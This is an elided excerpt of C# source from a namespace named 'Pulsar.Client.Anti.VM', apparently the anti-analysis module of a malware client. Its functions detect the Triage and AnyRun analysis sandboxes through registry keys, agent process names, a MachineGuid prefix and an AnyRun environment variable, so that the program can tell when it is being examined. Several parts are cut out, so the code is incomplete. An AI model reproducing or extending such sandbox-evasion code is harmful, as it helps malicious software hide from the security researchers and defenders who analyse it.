...
namespace Pulsar.Client.Anti.VM
{
  ...
  /// <summary>
    ...
    /// <summary>
    /// Checks for specific disk drive models and registry keys that indicate a Triage (tria.ge) virtual environment.
    /// </summary>
    /// <returns>True if Triage-specific artifacts are detected, otherwise false.</returns>
    public static bool TriageCheck()
    {
        try
        {
            ...
            // Check Triage-specific registry keys
            string[] triageRegistryKeys = {
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Triage",
                @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\qemu-ga"
            };
            foreach (string key in triageRegistryKeys)
            {
                try
                {
            ...
            // Check Triage-specific processes
            string[] triageProcesses = { "qemu-ga.exe", "triage-agent.exe" };
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    foreach (string badProcess in triageProcesses)
                    {
                        if (process.ProcessName.ToLower().Contains(badProcess.ToLower()))
                        {
                            return true;
                        }
                    }
    ...
    /// <summary>
    /// Checks for specific Machine GUIDs, processes, and registry keys that indicate an AnyRun virtual environment.
    /// </summary>
    /// <returns>True if AnyRun-specific artifacts are detected, otherwise false.</returns>
    public static bool AnyRunCheck()
    {
        try
        {
            ...
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
            {
                if (key != null)
                {
                    string machineGuid = key.GetValue("MachineGuid")?.ToString()?.ToLower();
                    // AnyRun VMs often use GUIDs starting with specific patterns (e.g., "00000000-")
                    if (!string.IsNullOrEmpty(machineGuid) && machineGuid.StartsWith("00000000-"))
                    {
                        return true;
                    }
                }
            ...
            // Check AnyRun-specific registry keys
            string[] anyRunRegistryKeys = {
                @"HKEY_LOCAL_MACHINE\SOFTWARE\AnyRun",
                @"HKEY_CURRENT_USER\Software\AnyRun"
            };
            foreach (string keyPath in anyRunRegistryKeys)
            {
                try
                {
                    ...
                    RegistryKey regKey = hive == "HKEY_LOCAL_MACHINE" ? Registry.LocalMachine.OpenSubKey(subKey) : Registry.CurrentUser.OpenSubKey(subKey);
                    if (regKey != null)
                    {
                        regKey.Close();
                        return true;
            ...
            // Check AnyRun-specific processes
            string[] anyRunProcesses = { "aswEngSrv.exe", "anyrun-agent.exe" };
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    foreach (string badProcess in anyRunProcesses)
                    {
                        if (process.ProcessName.ToLower().Contains(badProcess.ToLower()))
                        {
                            return true;
            ...
            // Check AnyRun environment variable
            string anyRunTaskId = Environment.GetEnvironmentVariable("ANYRUN_TASK_ID");
            if (!string.IsNullOrEmpty(anyRunTaskId))
            {
                return true;
            }
        }
